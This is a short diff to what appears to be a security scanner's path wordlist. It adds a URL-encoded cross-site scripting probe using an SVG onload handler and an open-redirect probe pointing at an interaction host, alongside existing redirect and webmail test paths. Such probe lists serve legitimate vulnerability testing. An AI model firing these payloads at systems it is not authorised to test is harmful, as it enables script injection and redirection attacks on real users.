@@ -7,3 +7,5 @@
 /webmail/?mid={{to_lower(rand_base(4))}}
 /webmail/?color=
 /%5coast.pro/%2f%2e%2e
+/?meta=%3Csvg%2Fonload=confirm%28document.domain%29%3E
+///interact.sh/%2F..
